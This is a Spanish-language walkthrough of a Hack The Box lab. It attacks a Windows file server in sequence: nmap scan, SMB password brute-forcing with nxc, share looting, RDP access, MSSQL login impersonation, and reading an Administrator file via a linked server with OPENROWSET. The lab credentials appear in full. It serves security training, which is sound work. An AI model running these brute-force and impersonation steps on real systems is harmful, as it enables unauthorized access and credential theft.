# Attacking Common Services - Hard

## Enunciado

The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.

## Solución

### nmap

- Encontramos los sguientes puertos abiertos: 
    ```bash
    nmap -p- -v --open -sS --min-rate 5000 -Pn -n -oG openPorts_10.129.194.81 -oN openPorts_10.129.194.81.txt 10.129.194.81
    ```
    Encontrando los siguientes puertos abiertos

    ```txt
    PORT     STATE SERVICE
    135/tcp  open  msrpc
    445/tcp  open  microsoft-ds
    1433/tcp open  ms-sql-s
    3389/tcp open  ms-wbt-server
    ```

### Puerto 445 - `simon`

- Con los datos obtenidos en el laboratorio anterior hacemos fuerza bruta sobre el protocolo `smb`

    ```bash
    nxc smb $target -u 'simon' -p mynotes.txt    
    ```

    Encontrando credenciales válidas: `simon:234987123948729384293`

- Comprobamos que tenemos acceso de lectura a la carpeta `HOME` con el siguiente comando

    ```bash
    nxc smb $target -u 'simon' -p '234987123948729384293' --shares
    ```

- Accedemos al servicio con `smbclient`
    ```
    smbclient -U simon //$target/HOME
    ```

- Descargamos todo el contenido posible (desde la carpeta /home)

    ```bash
    smb: \> mask ""
    smb: \> recurse ON
    smb: \> prompt OFF
    smb: \> lcd ../content/
    smb: \> mget *
    ```

- Con el contenido descargado (hay varias carpetas) listamos los archivos: 

    ```bash
    find . -type f | awk '{print "\n\n=== " $0 " ==="; system("cat " $0)}'
    ```

    obteniendo lo siguiente

    ```textplain
    === ./Simon/random.txt ===
    Credentials

    (k20ASD10934kadA
    KDIlalsa9020$
    JT9ads02lasSA@
    Kaksd032klasdA#
    LKads9kasd0-@

    === ./John/notes.txt ===
    Hack The Box is a massive, online cybersecurity training platform, allowing individuals, companies, universities and all kinds of organizations around the world ...

    === ./John/secrets.txt ===
    Password Lists:

    1234567
    (DK02ka-dsaldS
    Inlanefreight2022
    Inlanefreight2022!
    TestingDB123



    === ./John/information.txt ===
    To do:
    - Keep testing with the database.
    - Create a local linked server.
    - Simulate Impersonation.

    === ./Fiona/creds.txt ===
    Windows Creds

    kAkd03SA@#!
    48Ns72!bns74@S84NNNSl
    SecurePassword!
    Password123!
    SecureLocationforPasswordsd123!!
    ```


- Con esta información podemos responder a la primera pregunta: `What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)`: R: `random.txt`

### Puerto 445 - Fiona

- Hacemos fuerza bruta con `nxc` para obtener la pass de `Fiona`

    ```bash
    nxc smb $target -u 'Fiona' -p Fiona/creds.txt
    ```

    Encontrando credenciales válidas: `Fiona:48Ns72!bns74@S84NNNSl`

    Lo que nos permite responder a la pregunta ` Enumerate the target and find a password for the user Fiona. What is her password?`

    Con la información obtenida antes, también podemos responder a la siguiente pregunta: `Once logged in, what other user can we compromise to gain admin privileges?` R: `john`

### Puerto 3389 - Fiona

- Con las credenciales obtenidas nos podemos conectar por `rdp` a la máquina

    ```bash
    xfreerdp /v:$target /u:Fiona /p:'48Ns72!bns74@S84NNNSl'
    ```

    Con esto podríamos acceder directamente a la basde de datos `MSSQL` como usuario `Fiona` escribiendo `sqlcmd` en powershell. 
    
    También nos podemos conectar a la base de datos escribiendo lo siguiente: 

    ```bash
    /usr/bin/impacket-mssqlclient Fiona@$target -p 1433 -windows-auth
    ```

- Una vez dentro de `mssql` vemos que no tenemos acceso de lectura a todas las bases de datos, por lo que vemos que usuarios podemos suplantar escribiendo lo siguiente: 

    ```sql
    SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
    ```

    Encontrando como usuarios `john` y `simon`. 
    
- Suplantamos al usuario  `simon`

    ```sql
    EXECUTE AS LOGIN = 'simon'
    ```

- Ahora tenemos acceso de lectura a la base de datos `TestAPPdb` , obteniendo lo siguiente

    ```sql
    SELECT table_name FROM TestAPPdb.INFORMATION_SCHEMA.TABLES
    table_name   
    ----------   
    tb_users     
    select * from tb_users
    username    password           privileges   
    ---------   ----------------   ----------   
    b'patric'   b'Testuser123!'    b'user'      

    b'julio'    b'Testadmin123!'   b'admin' 

    ```

- Aunque parece útil esta información obtenida, comprobamos las bases de datos  enlazadas, 

    ```sql
    SELECT srvname, isremote FROM sysservers;
    ```

    Encontrando una base de datos llamada `LOCAL.TEST.LINKED.SRV`.

- Podemos leer archivos de esta base de datos escribiendo lo siguiente (combinación de lectura de archivos y ejecución de comandos en ):

    ```sql
    execute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv];
    ```

    

